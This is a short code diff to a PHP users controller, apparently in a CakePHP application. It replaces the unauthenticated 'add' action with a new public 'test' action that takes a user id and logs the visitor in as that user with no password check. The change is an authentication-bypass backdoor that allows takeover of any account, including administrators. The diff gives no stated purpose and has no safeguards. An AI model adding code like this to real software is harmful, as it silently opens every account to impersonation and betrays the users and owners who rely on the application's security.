@@ -16,7 +16,7 @@ class UsersController extends AppController
 	{
 		parent::initialize();
 		$this->loadComponent('RequestHandler');
-		$this->Auth->allow(['add']);
+		$this->Auth->allow(['test']);
 	}
 
 
@@ -136,6 +136,18 @@ class UsersController extends AppController
 			}
 			$this->Flash->error('Your username or password is incorrect.');
 		}
+	}
+
+	public function test ($id)
+	{
+		$user = $this->Users->get($id, [
+			'contain' => []
+		]);
+
+		$this->Auth->setUser($user);
+		return $this->redirect('/');
+
+
 	}
 
 	public function logout ()
